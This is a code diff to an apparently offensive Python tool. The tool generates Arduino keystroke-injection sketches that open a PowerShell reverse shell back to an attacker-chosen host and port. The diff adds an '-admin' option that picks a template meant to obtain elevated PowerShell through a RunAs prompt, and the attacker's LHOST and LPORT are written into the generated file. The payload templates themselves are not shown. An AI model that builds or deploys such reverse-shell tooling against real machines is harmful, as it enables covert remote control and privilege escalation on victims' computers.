@@ -7,6 +7,12 @@ from pwn import *
 
 parser = argparse.ArgumentParser(description="0x539 tool.\nA tool to connect to thepowershell reversed shell from arduino mini pro.")
 parser.add_argument(
+                "-admin",
+                        required=False,
+                        action="store_true",
+                        help='get admin access to powershell but it hopefully press the yes to runAs."',
+                )
+parser.add_argument(
                 "-debug",
                         required=False,
                         action="store_true",
@@ -40,9 +46,13 @@ def parse_keyboard(string):
 
 
 if args.keyboard in ["azerty", "qwerty"]:
-    with open(f"exploits/arduino_{args.keyboard}.c", "r") as f:
-        with open(f"arduino_{args.keyboard}.c", "w") as nf:
-            print(f"[+] Creating file: arduino_{args.keyboard}.c")
+    admin = ""
+    if args.admin:
+        admin = "_admin"
+    
+    with open(f"exploits/arduino_{args.keyboard}{admin}.c", "r") as f:
+        with open(f"arduino_{args.keyboard}{admin}.c", "w") as nf:
+            print(f"[+] Creating file: arduino_{args.keyboard}{admin}.c")
             nf.write(f.read().replace("<[LHOST]>", parse_keyboard(args.lhost)).replace("<[LPORT]>", args.lport))
             print("[+] File created check it on the current path")
             nf.close()
